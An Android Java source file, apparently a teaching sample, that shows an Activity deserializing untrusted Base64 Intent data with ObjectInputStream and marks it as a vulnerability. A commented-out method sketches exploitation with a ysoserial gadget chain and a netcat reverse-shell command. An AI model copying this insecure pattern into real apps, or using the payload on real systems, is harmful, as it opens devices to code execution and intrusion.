package com.example.vulnerableapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Base64;
import android.widget.TextView;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

/**
 * 模拟存在不安全反序列化的移动应用Activity
 * 攻击者可通过构造恶意Intent传递序列化对象
 */
public class UserProfileActivity extends Activity {
    
    // 模拟用户数据类
    public static class User implements Serializable {
        private String username;
        private String avatarUrl;
        
        public User(String username, String avatarUrl) {
            this.username = username;
            this.avatarUrl = avatarUrl;
        }
        
        public String getProfileInfo() {
            return "User: " + username + " | Avatar: " + avatarUrl;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        TextView textView = new TextView(this);
        setContentView(textView);
        
        // 获取Intent传递的序列化数据
        Intent intent = getIntent();
        if (intent.hasExtra("user_data")) {
            String serializedUser = intent.getStringExtra("user_data");
            
            try {
                // 不安全的反序列化操作
                byte[] data = Base64.decode(serializedUser, Base64.DEFAULT);
                ByteArrayInputStream bais = new ByteArrayInputStream(data);
                ObjectInputStream ois = new ObjectInputStream(bais);
                
                // 漏洞点：直接反序列化不可信数据
                User user = (User) ois.readObject();
                ois.close();
                
                textView.setText(user.getProfileInfo());
                
            } catch (Exception e) {
                textView.setText("Failed to load user profile");
                e.printStackTrace();
            }
        } else {
            textView.setText("No user data provided");
        }
    }
    
    // 模拟攻击者利用方式（实际攻击需通过Intent传递）
    public static void simulateAttack() {
        // 攻击者构造恶意序列化数据（示例伪代码）
        // 1. 构造包含Runtime.exec()的序列化链
        // 2. 使用ysoserial生成payload
        // String evilPayload = Base64.encodeToString(ysoserial.generate("CommonsCollections5", "nc -e /bin/sh 127.0.0.1 4444"));
        // 3. 通过intent传递：intent.putExtra("user_data", evilPayload);
    }
}